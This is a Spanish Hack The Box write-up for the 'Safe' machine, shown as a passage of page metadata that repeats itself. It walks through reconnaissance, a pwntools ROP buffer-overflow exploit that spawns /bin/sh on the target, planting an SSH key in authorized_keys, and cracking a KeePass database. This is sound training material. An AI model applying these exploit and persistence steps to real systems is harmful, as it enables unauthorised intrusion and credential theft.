flujo del programa por ahí, por lo que debemos ver, de qué manera, haciendo uso de las mismas posibilidades que nos ofrece el binario myapp, podemos explotarlo, a este concepto se lo conoce como ROP (Return Oriented Programming). Ya en este punto, sabido lo que tenemos que hacer, podemos empezar a aplicar ingeniería inversa sobre el binario, para hacerlo, haremos uso de Ghidra, una suite de herramientas dedicada a la ingeniería inversa, desarrollada por la NSA. Para descargar Ghidra, ingresaremos aquí, y descargaremos la versión más reciente. unzip &lt;archivoQueHayamosDescargado&gt; cd &lt;carpetaQueSeHayaCreado&gt; ./ghidraRun Presionaremos File, New Project, Non-Shared Project, elegiremos un espacio de trabajo, le damos un nombre a nuestro proyecto, presionamos File, Import File, seleccionamos el binario myapp, arrastramos el binario que acabamos de importar hacia el dragón, y finalmente aceptamos analizar. Ya en este punto podemos empezar a analizar que hay dentro del binario myapp, por ejemplo, podemos analizar que funciones están definidas, para ello, desplegaremos el menú Functions, que se encuentra al lado izquierdo, podemos empezar por analizar la función main. Si nos percatamos, esto es lo que encontramos cuando ejecutamos myapp; nos damos cuenta de que se está definiendo una variable de nombre local_78 que acepta una cierta cantidad de bytes, concretamente, 112, la cual almacena la cadena de caracteres que nos pide ingresar, para posteriormente, volver a mostrarla por pantalla, adicionalmente, se está ejecutando una llamada al sistema para ejecutar el comando uptime. Podemos observar dos cosas interesantes, por un lado, se está haciendo uso de la función gets(), una función considerada insegura, debido principalmente a que esta, no verifica la longitud del buffer, razón por la cual, podemos desbordarlo. Por otra parte, nos damos cuenta de que se está haciendo una llamada al sistema, algo que llama nuestra atención, ya que si lográramos introducir un comando diferente a uptime, podríamos conseguir una consola dentro de la máquina víctima. Pero, ¿cómo introducimos un comando si el programa ya está compilado? La respuesta está en la función test, y el concepto de ROP. No obstante, vamos a analizar el binario myapp, una vez más, con la diferencia de que vamos a empezar a automatizar lo que vamos a hacer, pues ya tenemos una idea clara de por donde van los tiros. Para ello, podemos crear un script en Python, para lo cual empezaremos por colocar la cabecera de Python 3, importar la librería pwntools, y definir tanto la arquitectura como el sistema operativo de la máquina víctima, adicionalmente, podemos definir que tipo de terminal queremos emplear para poder trabajar más a gusto. #!/usr/bin/python3 from pwn import * context.terminal = [&#39;gnome-terminal&#39;, &#39;-x&#39;] context.arch = &#39;amd64&#39; context.os = &#39;linux&#39; En caso de no contar con la librería pwntools, podemos hacer lo siguiente: apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential python3 -m pip install --upgrade pip python3 -m pip install --upgrade pwntools Una vez definida la base del script, podemos empezar a trabajar. Nos interesa saber en que registro, se está almacenando el comando uptime, para lo cual, empezaremos por definir un proceso, el cual será la depuración del binario, añadiremos un breakpoint en la dirección donde se hace la llamada al sistema, y, adicional a ello, indicaremos al script que nos espere hasta escribir algo después de What do you want me to echo back?, caso contrario, el script se cerrará. p = gdb.debug(&#39;/ubicación/del/binario/myapp&#39;, &#39;b *0x40116e&#39;) p.recvuntil(&quot;What do you want me to echo back?&quot;) La dirección de la llamada al sistema, la podemos sacar de Ghidra: Ejecutamos nuestro script, no sin antes haberle asignado los permisos correspondientes: chmod 744 &lt;nuestroScript.py&gt; En este punto podemos presionar la tecla c, para continuar, y nos daremos cuenta que el comando uptime, está siendo almacenado en el registro RDI. En este punto, tenemos que buscar una forma de sobrescribir el registro RDI, y la clave está en la función test Si nos percatamos, en la dirección 0x401156, el contenido que se encuentra en el registro RSP, está siendo almacenado en el registro RDI; ¿cuándo almacenábamos las 8 letras B, en qué registro las estábamos almacenando? Exacto, en RSP, por lo que ahora, debemos de buscar una forma en la que poder redirigir el flujo del programa a través de la función test, para que cuando esta termine, podamos ejecutar el comando que deseemos. Sin embargo, hay un pequeño problema, en la siguiente instrucción, 0x401159, se está efectuando un jump a R13, el cual apunta a una dirección que no nos interesa, por lo que también debemos de hallar una forma en la que inyectar la dirección en la que se efectúa la llamada al sistema, de modo que así, a la llamada al sistema, le estamos pasando como argumento nuestro código malicioso definido en RDI. La pregunta ahora es, ¿de qué manera inyectamos la dirección de la llamada al sistema, en R13? Esto lo haremos haciendo uso de gadgets, los cuales no son más que instrucciones de la CPU, ya definidas dentro del programa. Haciendo uso de nuestro script, escribiremos ahora ropper, lo cual nos permitirá listar todos los gadgets dentro del binario. Vemos que se nos lista un total de 99 gadgets, de los cuales nos interesa pop, ya que este nos permite cargar un valor en el registro al que esté asignado, por lo que procederemos a listar que opciones tenemos con el gadget pop. ropper --search &quot;pop&quot; Observamos, que tenemos una opción que nos permite hacer un pop a R13, aunque esta va seguida de pops a otras direcciones, por lo que a estas, tendremos que asignarles valores nulos, ya que no nos interesan. Ya con toda esta información, es posible finalmente, explotar el binario myapp, haciendo uso de Buffer Overflow, Return Oriented Programming y gadgets, por lo que regresaremos a nuestro script en Python. Lo primero que vamos a hacer, es comentar o borrar la línea en la que aplicábamos un breakpoint a la llamada al sistema, ya que no la vamos a usar más, esto mismo haremos con la línea del p.recvuntil(). Por otra parte, vamos a empezar por definir variables; la primera será popR13, la cual va a valer la dirección en la que se aplica este gadget; la segunda será system, la cual va a valer la dirección de la llamada al sistema; la tercera será test, la cual va a valer la dirección de la función test. La dirección de la función test, la podemos sacar de Ghidra: popR13 = p64(0x401206) system = p64(0x40116e) test = p64(0x401152) Es importante tener en cuenta que, en todo momento, estamos trabajando en 64 bits. Por otra parte, vamos a empezar por definir el número de letras A que queremos introducir, previo a desbordar el buffer, esto lo vamos a almacenar en una variable de nombre junk, eso si, deberemos de codificar la variable en formato bytes. junk = (&quot;A&quot;*112).encode() Si nos percatamos, estamos introduciendo 112 letras A, y no 120, porque ciertamente el buffer se desborda con 112 bytes, como pudimos ver con Ghidra, no obstante, para poder empezar a sobrescribir registros tenemos que introducir 120 bytes como vimos con GEF, pues estamos frente a un sistema operativo de 64 bits, por lo que necesitamos de 8 bytes para insertar un valor en el stack, en caso de estar en un sistema operativo de 32 bits, necesitaríamos de 4 bytes. Entonces, la variable local_78 ciertamente tiene una longitud máxima de 112 bytes, sin embargo, necesitamos de 8 bytes más, para desbordar satisfactoriamente el buffer, de este modo, los bytes siguientes a 112 se estarían almacenando en el registro RSP, pero hasta que no introduzcamos como mínimo 120 bytes, no vamos a conseguir un Segmentation Fault, razón por la cual, si al binario myapp, le pasamos una cadena ya sea de 113, 114, 115, 116 117, 118 o 119 bytes, conseguiremos una salida exitosa. Lo que nos interesa ahora, es sobrescribir el registro RSP con nuestro código malicioso, de modo que este pase al registro RSI, de modo que cuando se ejecute la función jump hacia la dirección de la llamada al sistema, nos ejecute nuestro código. Concretamente vamos a ejecutar el comando /bin/sh en adición de un null byte por si nos da problemas, la longitud total de esta cadena es de 8 bytes, (7 en /bin/sh, más el del null byte) por lo que estaríamos desbordando el buffer, e ingresando esta cadena en el registro RSP. La siguiente variable por definir será binSh, la cual, como mencionamos, valdrá el comando /bin/sh en adición de un null byte, y al igual que la variable junk, deberemos codificarla; la última variable que definiremos será, nullByte, la cual usaremos para asignar valores nulos a las direcciones R14 y R15. binSH = &quot;/bin/sh\x00&quot;.encode() nullByte = p64(0x0) Ya para finalizar, debemos indicar la cadena de caracteres que queremos enviar, después de que se nos pregunte What do you want me to echo back?, para hacer esto tendremos que hacer uso de p.sendline(), dentro del cual indicaremos las variables que acabamos de definir, en su respectivo orden. p.sendline(junk + binSH + popR13 + system + null + null + test) En primer lugar estamos introduciendo una cadena de 112 bytes, posteriormente introducimos nuestro código malicioso que suma una longitud de 8 bytes, de modo que estaríamos ya, sobrescribiendo el registro RSP, que se convertirá en RSI, posteriormente, haremos una llamada al gadget pop, al cual le pasaremos como argumentos lo que nos solicita, la dirección de R13, R14, R15 y RET, los cuales valdrán la dirección de la llamada al sistema, valor nulo, valor nulo y como función de regreso, la dirección de la función test, redirigiendo así, el flujo del programa a través de esa función. Ya lo que nos quedaría, sería ejecutar nuestro script, no de manera local, pero remota, para lo cual debemos introducir la dirección IP de la máquina víctima, e indicar el puerto a través del cual nos queremos conectar. p = remote(&quot;10.10.10.147&quot;, 1337) Así mismo, es necesario especificar que queremos interactuar con la consola que estamos consiguiendo, para lo cual deberemos indicar lo siguiente: p.interactive() Nuestro script, debería verse algo así: #!/usr/bin/python3 from pwn import * context.terminal = [&#39;gnome-terminal&#39;, &#39;-x&#39;] context.arch = &#39;amd64&#39; context.os = &#39;linux&#39; # p = gdb.debug(&#39;/ubicación/del/binario/myapp&#39;, &#39;b *0x40116e&#39;) # p.recvuntil(&quot;What do you want me to echo back?&quot;) p = remote(&quot;10.10.10.147&quot;, 1337) popR13 = p64(0x401206) system = p64(0x40116e) test = p64(0x401152) junk = (&quot;A&quot;*112).encode() binSh = &quot;/bin/sh\x00&quot;.encode() nullByte = p64(0x0) p.sendline(junk + binSh + popR13 + system + nullByte + nullByte + test) p.interactive() Al ejecutar nuestro script, lo que vamos a conseguir es una consola, por lo que una vez dentro del sistema, podríamos listar la flag del usuario con bajos privilegios. find / -name user.txt 2&gt; /dev/null Escalada De Privilegios Para conseguir la flag del usuario con máximos privilegios, podemos emepezar por listar el contenido dentro de la carpeta del usuario user. Nos vamos a encontrar con una serie de imágenes, en adición de un archivo de extensión .kdbx, el cual guarda relación con el gestor de contraseñas KeePass. Debido a que nos encontramos en una máquina remota, no podremos visualizar las imágenes alojadas dentro de la máquina víctima, por lo que tenemos que buscar una forma de transferirlas a nuestro equipo. Si recordamos, el puerto 22 estaba abierto, por lo que podríamos conectarnos por SSH a la máquina remota, no obstante, ¿cómo nos vamos a conectar sin proporcionar credenciales? Esto lo haremos introduciendo nuestra clave pública, dentro de un archivo de nombre authorized_keys ubicado en la carpeta .ssh, dentro del directorio del usuario user. Lo primero que haremos será crear un par de claves SSH, una pública, y una privda, esto lo haremos haciendo uso de ssh-key. cd ~/.ssh/ ssh-keygen En caso de querer ingresar algún tipo de contraseña, se lo puede hacer. Ya teniendo el par de claves SSH, vamos a copiar el contenido de nuestra clave pública, para posteiormente añadirla en la ruta /home/user/.ssh/authorized_keys. echo &quot;nuestraClavePública&quot; &gt;&gt; /home/user/.ssh/authorized_keys Una vez hecho esto, podemos conectarnos a través de SSH a la máquina víctima. ssh user@10.10.10.147 En vista de que estamos conectados a la máquina vía SSH, podríamos intentar transferir los archivos del directorio /home/user/, haciendo uso de SCP (Secure Copy Protocol), aunque también pudimos haberlo hecho creando un servidor en la máquina remota mediante Busybox, y posteriormente, descargando las imágnes a través de Wget. scp &quot;user@10.10.10.147:/home/user/*&quot; . Una vez tengamos tanto las imágenes como el archivo MyPasswords.kdbx en nuestro equipo, podemos empezar a analizar que hacer con ello; dudo mucho que las imágenes tengan algo que ver con esteganografía, ya que si abrimos el archivo MyPasswords.kdbx con keepassxc, nos pregunta por un archivo clave. En caso de no contar con keepassxc instalado, podemos hacer lo siguiente: sudo apt install keepassxc Ya en este punto, lo que se nos podría ocurrir sería intentar aplicar fuerza bruta sobre el archivo MyPasswords.kdbx, no obstante, primero tendremos que pasar de formato KeePass, a formato john, para crackear la contraseña haciendo uso de John the Ripper, de modo que usaremos keepass2john. Antes de hacerlo hay que recordar que las imágenes están por algo, para lo cual se las pasaremos como argumento a keepass2john, mediante el parámetro -k. Esto se vería algo así: keepass2john -k &lt;imagenDeseada&gt; MyPasswords.kdbx Esto va a hacer el trabajo, pero podemos reducir tiempo automatizándolo, para ello haremos uso de un bucle for, para ir iterando sobre cada imagen. for image in $(echo &quot;IMG_0545.JPG IMG_0546.JPG IMG_0547.JPG IMG_0548.JPG IMG_0552.JPG IMG_0553.JPG&quot;); do keepass2john -k $image MyPasswords.kdbx; done Utilizar el comando anterior nos sirve, sin embargo, si lo pensamos un poco, si redirigimos este ouput a un fichero hashes.txt, por ejemplo, al cual luego le aplicaremos john, cuando este encuentre la contraseña, nos dirá que la imágen que utilizó fue MyPasswords, lo cual no nos es de ayuda, por lo que podemos reemplazar MyPasswords, por el nombre de la imagen. for image in $(echo &quot;IMG_0545.JPG IMG_0546.JPG IMG_0547.JPG IMG_0548.JPG IMG_0552.JPG IMG_0553.JPG&quot;); do keepass2john -k $image MyPasswords.kdbx | sed &quot;s/MyPasswords/$image/&quot;; done &gt;&gt; nombreArchivo Finalmente, para crackear la contraseña, haremos uso de john en conjunto del diccionario rockyou.txt. En caso de no contar con la herramienta John the Ripper instalada, podemos hacer lo siguiente: sudo apt install john sudo john --wordlist=/dirección/del/diccionario/rockyou.txt nombreArchivo Una vez conseguimos tanto la contraseña como el archivo clave, ya podremos abrir el archivo MyPasswords.kdbx. Y ya con la contraseña del usuario root en nuestro poder, podremos listar la última flag." />
<link rel="canonical" href="http://0.0.0.0:8000/Safe-Hack-The-Box" />
<meta property="og:url" content="http://0.0.0.0:8000/Safe-Hack-The-Box" />
<meta property="og:site_name" content="Filthy Hacker" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-12-27T00:00:00-05:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Safe - Hack The Box" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"m4teo","url":"https://mateonitro550.github.io"},"dateModified":"2021-12-27T00:00:00-05:00","datePublished":"2021-12-27T00:00:00-05:00","description":"Hoy vamos a resolver la máquina Safe de Hack The Box. Es una máquina Linux de nivel de dificultad media en la intrusión, y media en la escalada de privilegios según figura en la plataforma. Fase De Reconocimiento Primeramente vamos a lanzar una traza ICMP para saber si la máquina está activa. ping -c 1 10.10.10.147 Una vez comprobamos que la máquina está activa (pues nos devuelve una respuesta), podemos también determinar a que tipo de máquina nos estamos enfrentando en base al valor del TTL; en este caso el valor del TTL de la máquina es 63, por lo que podemos intuir que estamos ante una máquina Linux. Recordemos que algunos de los valores referenciales son los siguientes: Sistema Operativo (OS) TTL Linux 64 Windows 128 Solaris 254 Si nos damos cuenta, en esta ocasión, el valor del TTL es 63 y no 64 como indica la tabla anterior, esto se debe a que en el entorno de máquinas de Hack The Box, no nos comunicamos directamente con la máquina a vulnerar, sino que existe un intermediario, por lo que el TTL disminuye en una unidad. ping -c 1 10.10.10.147 -R Posteriormente, vamos a utilizar la herramienta Nmap para determinar que puertos están abiertos, así como identificar la versión y servicios que corren en el activo. Para determinar que puertos están abiertos podemos realizar lo siguiente: nmap -p- --open -T5 -v -n 10.10.10.147 Y en caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa: sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.147 A continuación se explican los parámetros utilizados en el escaneo de puertos con Nmap: p - Escanea todo el rango de puertos (65535 en total) open - Nos indica todos aquellos puertos que están abiertos (o posiblemente abiertos) T5 - La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, “generaremos más ruido”, pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos White Hat v - Verbose, reporta lo encontrado por consola n - No aplicar resolución DNS sS - Escaneo TCP SYN min-rate - Emitir paquetes no más lentos que &lt;valor&gt; por segundo vvv - Triple verbose, para obtener mayor información por consola Pn - No aplicar host discovery Una vez hemos detectado los puertos que se encuentran abiertos en el activo, podemos pasar a determinar la versión y servicios que corren bajo estos puertos. nmap -sC -sV -p 22,80,1337 10.10.10.147 A continuación se explican los parámetros utilizados en el escaneo de versiones y servicios con Nmap: sC - Scripts básicos de enumeración sV - Versión y servicios que corren bajo los puertos encontrados p - Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior) Basándonos en la información que nos reporta Nmap, podemos darnos cuenta que la máquina víctima tiene abierto un puerto relacionado con HTTP; asimismo, encontramos abierto el puerto 1337, relacionado con el protocolo WASTE, el cual permite el intercambio de archivos de forma cifrada. Debido a que la máquina cuenta con el puerto 80 abierto, podríamos intentar aplicar fuzzing, no obstante, no vamos a encontrar nada interesante. Lo siguiente que podemos hacer es determinar ante que nos estamos enfrentando, para ello podemos hacer uso de WhatWeb, herramienta que se encarga de identificar que tecnologías web se están empleando, véase gestores de contenido (CMS), librerias o plugins, o finalmente el sistema operativo que se está utilizando para alojar el servidor web. whatweb http://10.10.10.147 Como podemos observar, no hay nada especialmente relevante a excepción del título de la página, el cual es el mensaje por defecto que aparece cuando montamos una página web haciendo uso del servidor Apache, por lo que podemos irnos haciendo a la idea, de que la entrada a la máquina, no será vía web. En vista de que ya no nos es posible trabajar desde la terminal, tendremos que visitar estas páginas desde nuestro navegador. En efecto, lo primero que vemos al abrir la página web, es la página por defecto que viene cuando montamos una página web mediante el servidor Apache, por lo que, podemos inspeccionar el código fuente, en busca de alguna pista; para verlo de manera más cómoda podemos hacer Ctrl + U. Si nos percatamos, en las primeras líneas del código fuente, hay un comentario que nos menciona que myapp, alojado en el puerto 1337, lo podemos descargar; para ello, podemos intentar añadir /myapp, al final del url. Los comentarios en HTML, siempre tienen la siguiente estructura: &lt;!-- Este es un comentario a modo de prueba --&gt; Al añadir /myapp, al final del url, se nos va a descargar un archivo que lleva por nombre, myapp, el cual vamos a empezar a analizar. Fase De Explotación Lo primero que debemos hacer, es saber que es myapp, para ello podemos usar el comando file. file myapp Nos damos cuenta de que el archivo myapp, es un binario, por lo que procederemos a darle permisos de ejecución para saber qué hace: chmod 744 myapp Al ejecutar el binario myapp, nos reporta por consola la hora actual, además de imprimir el mismo mensaje que introduzcamos; esto no nos es de ayuda, por lo que podríamos intentar extraer las cadenas de caracteres que se encuentran dentro del binario con el comando strings, sin embargo, no hay nada interesante. Lo siguiente que podríamos intentar, sería realizar un Buffer Overflow, para ello, cuándo el binario myapp, nos pregunte por una cadena de caracteres, debemos ingresar una que sea bastante larga. Una manera rápida con la cual podemos conseguir cadenas de caracteres cuan largas queramos, sería haciendo uso de Python. python -c &#39;print &quot;A&quot;*365&#39; Si nos percatamos, al introducir nuestra cadena de 365 letras A, el binario myapp, deja de funcionar como debería, esto se debe a un Segmentation Fault (Fallo de Segmentación), los cuales se dan cuando empezamos a sobrescribir registros. Ahora, ¿por qué se están sobrescribiendo algunos registros? Cuando el programa myapp, nos pregunta por una cadena de caracteres, este almacena nuestra respuesta en un bloque de memoria, el buffer, el cual puede almacenar una cierta cantidad de bytes, la cual de momento desconocemos; si introducimos una cantidad de bytes mayor a la que el buffer estaba diseñado, el programa corrompe. La pregunta ahora es, ¿a dónde se dirigen estos bytes que están desbordando el buffer, acaso desaparecen? La respuesta es no, como mencioné, empezamos a sobrescribir registros, de modo que los bytes siguientes a la cantidad máxima de bytes que soporta el buffer, se dirigen al siguiente valor de memoria, y así sucesivamente. El concepto de Buffer Overflow puede parecer complejo en un inicio, pero es mucho más fácil de asimilarlo cuando lo visualizamos; para ello, haremos uso de GDB, herramienta que nos permitirá depurar el binario myapp. Concretamente estaré haciendo uso de GEF (GDB Enhanced Features), el cual es una extensión para GDB, así como lo es PEDA (Python Exploit Development Assistance). Si queremos instalar GEF, podemos seguir las instrucciones dadas por la página oficial, no obstante, en mi caso, esto no me funcionó, por lo que tuve que realizar lo siguiente: pip3 install capstone unicorn keystone-engine ropper wget https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/gefInstall.sh chmod 744 gefInstall.sh ./gefInstall.sh rm gefInstall.sh Ya con GEF instalado podemos empezar a depurar el binario myapp. gdb myapp run Algo importante a mencionar, antes de empezar el análisis con GEF, es que la arquitectura del sistema ante el que nos estamos enfrentando a la hora de explotar Buffer Overflow, tiene bastante relevancia; en este caso concreto, nos estamos enfrentando ante una máquina de 64 bits, y esto lo podemos saber ya que el nombre de los registros empieza por ‘R’ (RBP, RSP, RIP), en caso de que el sistema fuera de 32 bits, el nombre de los registros empezaría por ‘E’ (EBP, ESP, EIP), no obstante, independientemente de la arquitectura, estos registros se refieren a lo mismo. Para explotar un Buffer Overflow satisfactoriamente, existen dos requisitos indispensables, el primero es sobrescribir el registro RIP o EIP (según corresponda), ya que este, apunta a la dirección siguiente a ejecutar, por lo que nos interesa como atacantes redirigir el flujo del programa a nuestro antojo, cabe aclarar que la dirección introducida debe de existir dentro del programa, caso contrario, este corromperá como lo está haciendo ahora mismo; el segundo requisito se refiere a, de qué manera vamos a sobrescribir el registro RIP, para ello debemos calcular su offset. Sobre el mensaje Cannot disassemble from $PC, veremos una pequeña flecha que nos indica en que sección, el programa dejó de funcionar, en este caso es en una función de retorno que apunta hacia el registro RSP, el cual, si nos percatamos, está lleno de letras A; nuestro objetivo ahora es, determinar después de cuántos bytes, empezaremos a sobrescribir el registro RSP. Haciendo uso de GEF, esto es bastante sencillo, ya que lo hará por nosotros, por lo que debemos realizar lo siguiente: gdb myapp pattern create run pattern offset $rsp Sabemos ahora que, después de ingresar 120 bytes, empezaremos a sobrescribir el registro RSP, y esto lo podemos comprobar de manera sencilla, intentando ingresar en este registro, 8 letras B, por ejemplo. python -c &#39;print &quot;A&quot;*120 + &quot;B&quot;*8&#39; gdb myapp run En efecto, al ingresar 120 bytes, empezamos a sobrescribir el RSP, ya con esto en mente, debemos verificar que estándares de seguridad se están aplicando sobre el binario, para así determinar que metodología emplearemos para explotarlo; para conocer que seguridades se están aplicando, haremos uso de checksec, esto podemos hacerlo tanto dentro de GEF, como fuera de él. gdb myapp checksec checksec myapp Podemos observar que el DEP (Data Execution Prevention), o NX (No-Execute), está activado; esta protección nos impedirá ejecutar código a través del stack, por lo que no tendrá sentido redirigir el flujo del programa por ahí, por lo que debemos ver, de qué manera, haciendo uso de las mismas posibilidades que nos ofrece el binario myapp, podemos explotarlo, a este concepto se lo conoce como ROP (Return Oriented Programming). Ya en este punto, sabido lo que tenemos que hacer, podemos empezar a aplicar ingeniería inversa sobre el binario, para hacerlo, haremos uso de Ghidra, una suite de herramientas dedicada a la ingeniería inversa, desarrollada por la NSA. Para descargar Ghidra, ingresaremos aquí, y descargaremos la versión más reciente. unzip &lt;archivoQueHayamosDescargado&gt; cd &lt;carpetaQueSeHayaCreado&gt; ./ghidraRun Presionaremos File, New Project, Non-Shared Project, elegiremos un espacio de trabajo, le damos un nombre a nuestro proyecto, presionamos File, Import File, seleccionamos el binario myapp, arrastramos el binario que acabamos de importar hacia el dragón, y finalmente aceptamos analizar. Ya en este punto podemos empezar a analizar que hay dentro del binario myapp, por ejemplo, podemos analizar que funciones están definidas, para ello, desplegaremos el menú Functions, que se encuentra al lado izquierdo, podemos empezar por analizar la función main. Si nos percatamos, esto es lo que encontramos cuando ejecutamos myapp; nos damos cuenta de que se está definiendo una variable de nombre local_78 que acepta una cierta cantidad de bytes, concretamente, 112, la cual almacena la cadena de caracteres que nos pide ingresar, para posteriormente, volver a mostrarla por pantalla, adicionalmente, se está ejecutando una llamada al sistema para ejecutar el comando uptime. Podemos observar dos cosas interesantes, por un lado, se está haciendo uso de la función gets(), una función considerada insegura, debido principalmente a que esta, no verifica la longitud del buffer, razón por la cual, podemos desbordarlo. Por otra parte, nos damos cuenta de que se está haciendo una llamada al sistema, algo que llama nuestra atención, ya que si lográramos introducir un comando diferente a uptime, podríamos conseguir una consola dentro de la máquina víctima. Pero, ¿cómo introducimos un comando si el programa ya está compilado? La respuesta está en la función test, y el concepto de ROP. No obstante, vamos a analizar el binario myapp, una vez más, con la diferencia de que vamos a empezar a automatizar lo que vamos a hacer, pues ya tenemos una idea clara de por donde van los tiros. Para ello, podemos crear un script en Python, para lo cual empezaremos por colocar la cabecera de Python 3, importar la librería pwntools, y definir tanto la arquitectura como el sistema operativo de la máquina víctima, adicionalmente, podemos definir que tipo de terminal queremos emplear para poder trabajar más a gusto. #!/usr/bin/python3 from pwn import * context.terminal = [&#39;gnome-terminal&#39;, &#39;-x&#39;] context.arch = &#39;amd64&#39; context.os = &#39;linux&#39; En caso de no contar con la librería pwntools, podemos hacer lo siguiente: apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential python3 -m pip install --upgrade pip python3 -m pip install --upgrade pwntools Una vez definida la base del script, podemos empezar a trabajar. Nos interesa saber en que registro, se está almacenando el comando uptime, para lo cual, empezaremos por definir un proceso, el cual será la depuración del binario, añadiremos un breakpoint en la dirección donde se hace la llamada al sistema, y, adicional a ello, indicaremos al script que nos espere hasta escribir algo después de What do you want me to echo back?, caso contrario, el script se cerrará. p = gdb.debug(&#39;/ubicación/del/binario/myapp&#39;, &#39;b *0x40116e&#39;) p.recvuntil(&quot;What do you want me to echo back?&quot;) La dirección de la llamada al sistema, la podemos sacar de Ghidra: Ejecutamos nuestro script, no sin antes haberle asignado los permisos correspondientes: chmod 744 &lt;nuestroScript.py&gt; En este punto podemos presionar la tecla c, para continuar, y nos daremos cuenta que el comando uptime, está siendo almacenado en el registro RDI. En este punto, tenemos que buscar una forma de sobrescribir el registro RDI, y la clave está en la función test Si nos percatamos, en la dirección 0x401156, el contenido que se encuentra en el registro RSP, está siendo almacenado en el registro RDI; ¿cuándo almacenábamos las 8 letras B, en qué registro las estábamos almacenando? Exacto, en RSP, por lo que ahora, debemos de buscar una forma en la que poder redirigir el flujo del programa a través de la función test, para que cuando esta termine, podamos ejecutar el comando que deseemos. Sin embargo, hay un pequeño problema, en la siguiente instrucción, 0x401159, se está efectuando un jump a R13, el cual apunta a una dirección que no nos interesa, por lo que también debemos de hallar una forma en la que inyectar la dirección en la que se efectúa la llamada al sistema, de modo que así, a la llamada al sistema, le estamos pasando como argumento nuestro código malicioso definido en RDI. La pregunta ahora es, ¿de qué manera inyectamos la dirección de la llamada al sistema, en R13? Esto lo haremos haciendo uso de gadgets, los cuales no son más que instrucciones de la CPU, ya definidas dentro del programa. Haciendo uso de nuestro script, escribiremos ahora ropper, lo cual nos permitirá listar todos los gadgets dentro del binario. Vemos que se nos lista un total de 99 gadgets, de los cuales nos interesa pop, ya que este nos permite cargar un valor en el registro al que esté asignado, por lo que procederemos a listar que opciones tenemos con el gadget pop. ropper --search &quot;pop&quot; Observamos, que tenemos una opción que nos permite hacer un pop a R13, aunque esta va seguida de pops a otras direcciones, por lo que a estas, tendremos que asignarles valores nulos, ya que no nos interesan. Ya con toda esta información, es posible finalmente, explotar el binario myapp, haciendo uso de Buffer Overflow, Return Oriented Programming y gadgets, por lo que regresaremos a nuestro script en Python. Lo primero que vamos a hacer, es comentar o borrar la línea en la que aplicábamos un breakpoint a la llamada al sistema, ya que no la vamos a usar más, esto mismo haremos con la línea del p.recvuntil(). Por otra parte, vamos a empezar por definir variables; la primera será popR13, la cual va a valer la dirección en la que se aplica este gadget; la segunda será system, la cual va a valer la dirección de la llamada al sistema; la tercera será test, la cual va a valer la dirección de la función test. La dirección de la función test, la podemos sacar de Ghidra: popR13 = p64(0x401206) system = p64(0x40116e) test = p64(0x401152) Es importante tener en cuenta que, en todo momento, estamos trabajando en 64 bits. Por otra parte, vamos a empezar por definir el número de letras A que queremos introducir, previo a desbordar el buffer, esto lo vamos a almacenar en una variable de nombre junk, eso si, deberemos de codificar la variable en formato bytes. junk = (&quot;A&quot;*112).encode() Si nos percatamos, estamos introduciendo 112 letras A, y no 120, porque ciertamente el buffer se desborda con 112 bytes, como pudimos ver con Ghidra, no obstante, para poder empezar a sobrescribir registros tenemos que introducir 120 bytes como vimos con GEF, pues estamos frente a un sistema operativo de 64 bits, por lo que necesitamos de 8 bytes para insertar un valor en el stack, en caso de estar en un sistema operativo de 32 bits, necesitaríamos de 4 bytes. Entonces, la variable local_78 ciertamente tiene una longitud máxima de 112 bytes, sin embargo, necesitamos de 8 bytes más, para desbordar satisfactoriamente el buffer, de este modo, los bytes siguientes a 112 se estarían almacenando en el registro RSP, pero hasta que no introduzcamos como mínimo 120 bytes, no vamos a conseguir un Segmentation Fault, razón por la cual, si al binario myapp, le pasamos una cadena ya sea de 113, 114, 115, 116 117, 118 o 119 bytes, conseguiremos una salida exitosa. Lo que nos interesa ahora, es sobrescribir el registro RSP con nuestro código malicioso, de modo que este pase al registro RSI, de modo que cuando se ejecute la función jump hacia la dirección de la llamada al sistema, nos ejecute nuestro código. Concretamente vamos a ejecutar el comando /bin/sh en adición de un null byte por si nos da problemas, la longitud total de esta cadena es de 8 bytes, (7 en /bin/sh, más el del null byte) por lo que estaríamos desbordando el buffer, e ingresando esta cadena en el registro RSP. La siguiente variable por definir será binSh, la cual, como mencionamos, valdrá el comando /bin/sh en adición de un null byte, y al igual que la variable junk, deberemos codificarla; la última variable que definiremos será, nullByte, la cual usaremos para asignar valores nulos a las direcciones R14 y R15. binSH = &quot;/bin/sh\\x00&quot;.encode() nullByte = p64(0x0) Ya para finalizar, debemos indicar la cadena de caracteres que queremos enviar, después de que se nos pregunte What do you want me to echo back?, para hacer esto tendremos que hacer uso de p.sendline(), dentro del cual indicaremos las variables que acabamos de definir, en su respectivo orden. p.sendline(junk + binSH + popR13 + system + null + null + test) En primer lugar estamos introduciendo una cadena de 112 bytes, posteriormente introducimos nuestro código malicioso que suma una longitud de 8 bytes, de modo que estaríamos ya, sobrescribiendo el registro RSP, que se convertirá en RSI, posteriormente, haremos una llamada al gadget pop, al cual le pasaremos como argumentos lo que nos solicita, la dirección de R13, R14, R15 y RET, los cuales valdrán la dirección de la llamada al sistema, valor nulo, valor nulo y como función de regreso, la dirección de la función test, redirigiendo así, el flujo del programa a través de esa función. Ya lo que nos quedaría, sería ejecutar nuestro script, no de manera local, pero remota, para lo cual debemos introducir la dirección IP de la máquina víctima, e indicar el puerto a través del cual nos queremos conectar. p = remote(&quot;10.10.10.147&quot;, 1337) Así mismo, es necesario especificar que queremos interactuar con la consola que estamos consiguiendo, para lo cual deberemos indicar lo siguiente: p.interactive() Nuestro script, debería verse algo así: #!/usr/bin/python3 from pwn import * context.terminal = [&#39;gnome-terminal&#39;, &#39;-x&#39;] context.arch = &#39;amd64&#39; context.os = &#39;linux&#39; # p = gdb.debug(&#39;/ubicación/del/binario/myapp&#39;, 